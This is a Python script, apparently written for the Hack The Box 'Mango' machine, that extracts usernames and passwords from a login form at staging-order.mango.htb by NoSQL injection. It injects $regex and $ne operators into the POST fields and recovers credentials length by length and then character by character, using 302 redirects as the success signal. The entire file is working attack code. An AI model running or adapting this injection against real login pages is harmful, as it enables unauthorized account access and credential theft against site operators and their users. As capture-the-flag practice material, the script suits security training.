#!/usr/bin/env python3
# Note this script cannot handle that username/password that have '&', '^' or other stuff cannot be used in post or python format.
# use printf-like format instead of stirng.format because %%s is fine in printf-like but {{} is not ok in string.format.
# url encoding may give some false positives.
# TODO: it is not likely for a user to have two passwords. Thus we can return earlier.

import requests
import string
import urllib.parse

URL = "http://staging-order.mango.htb"
HEADERS = {
    "Host": "staging-order.mango.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "51",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
}

def guess_with_length(payload_tmpl, length):
    if length == 0:
        return ['']
    print("Trying with payload_tmpl:", payload_tmpl, "and length", length)
    results = []
    for c in string.printable:
        if c not in ['*','+','.','?','|', '&', '^']:  # The chars that cannot be used in regex or post.
            r = requests.post(URL, headers=HEADERS,
                    data=payload_tmpl % c,
                    allow_redirects=False)
            if r.status_code == 302: # found
                results += [c + sub for sub in guess_with_length(payload_tmpl % (c + "%s"), length - 1)]
    return results

# Note there could be multiple users.
def guess(payload_tmpl):
    lengths = []
    for length in range(100):
        r = requests.post(URL, headers=HEADERS,
                data=payload_tmpl % ("^.{%d}$" % length),
                allow_redirects=False)
        if r.status_code == 302: # found
            lengths.append(length)
    if len(lengths) == 0:
        raise Exception("The length is not found.")
    print("lengths are:", lengths)

    results = []
    for length in lengths:
        print("Trying length:", length)
        tmp_results = guess_with_length(payload_tmpl % "^%s", length)
        print("Find results:", tmp_results)
        results += tmp_results
    return results

def main():
    payload = "username[$regex]=%s&password[$ne]=notexistpassword&login=login"
    usernames = guess(payload)
    print("usernames are:", usernames)
    for username in usernames:
        payload = "username=" + username + "&password[$regex]=%s&login=login"
        password = guess(payload)
        print(username, ":", password)

if __name__ == '__main__':
    main()
